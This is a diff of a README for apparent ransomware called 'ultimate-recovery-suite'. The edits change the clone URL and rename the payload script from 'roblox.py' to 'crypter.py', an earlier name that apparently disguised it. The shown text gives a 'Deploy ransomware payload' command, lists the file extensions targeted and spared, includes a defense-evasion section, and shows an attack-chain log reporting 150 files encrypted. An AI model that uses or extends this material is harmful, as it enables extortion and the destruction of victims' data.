@@ -44,7 +44,7 @@
 
 ```bash
 # 1. Clone operational repository
-git clone https://github.com/yourusername/ultimate-recovery-suite.git
+git clone https://github.com/Otello96/ultimate-recovery-suite
 cd ultimate-recovery-suite
 
 # 2. Create isolated test environment (MANDATORY)
@@ -62,7 +62,7 @@ echo "Database backup" > db.sql
 
 ```bash
 # Deploy ransomware payload
-python ../roblox.py
+python ../crypter.py
 ```
 Execution Flow:
 
@@ -155,7 +155,7 @@ else:
 - 💻 .js .html .css .json .xml
 - 💾 .sql .db .mdb
 ### PROTECTED EXTENSIONS:
-🚫 .exe .dll .sys .drv .py .pyc .pyw ransoware.py
+🚫 .exe .dll .sys .drv .py .pyc .pyw crypter.py
 
 ## 🛡️ DEFENSE EVASION
 - Legitimate Python: Standard library only (tkinter, base64)
@@ -166,7 +166,7 @@ else:
 ## 🔄 ATTACK CHAIN
 
 ### [INFECTION]
-- 08:00 → python roblox.py
+- 08:00 → python crypter.py
 - 08:01 → URS-A1B2C3D4 | Key: QWERTY...
 - 08:02 → 150 files encrypted ✅
 - 08:03 → GUI launched 🎬
